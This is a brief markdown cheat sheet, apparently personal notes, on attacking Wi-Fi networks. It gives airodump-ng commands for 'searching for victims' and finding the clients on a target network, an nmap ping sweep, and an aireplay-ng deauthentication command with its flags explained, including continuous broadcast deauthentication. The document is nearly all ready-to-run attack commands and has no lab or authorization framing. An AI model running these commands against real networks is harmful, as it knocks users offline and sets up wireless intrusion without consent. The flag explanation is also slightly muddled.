## Searching for victims with airodump-ng

```bash
sudo airodump-ng wlan0mon
```

## find any devices connected to the network

airodump-ng -d "target's BSSID" -c "target's channel number" "wireless adapter monitor mode name"

```bash
sudo airodump-ng -d 50:C7:BF:DC:4C:E8 -c 11 wlan0mon
```

## Deauthentication attack

1. who's in the network

```bash
sudo nmap -sn 192.168.178.0/24
```

2. send deauth packages

```bash
sudo aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- 0 means deauthentication
1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously
- a 00:14:6C:7E:40:80 is the MAC address of the access point
- c 00:0F:B5:34:30:30 is the MAC address of the client to deauthenticate; if this is omitted then broadcast deauthentication is sent (not always work)
- ath0 is the interface name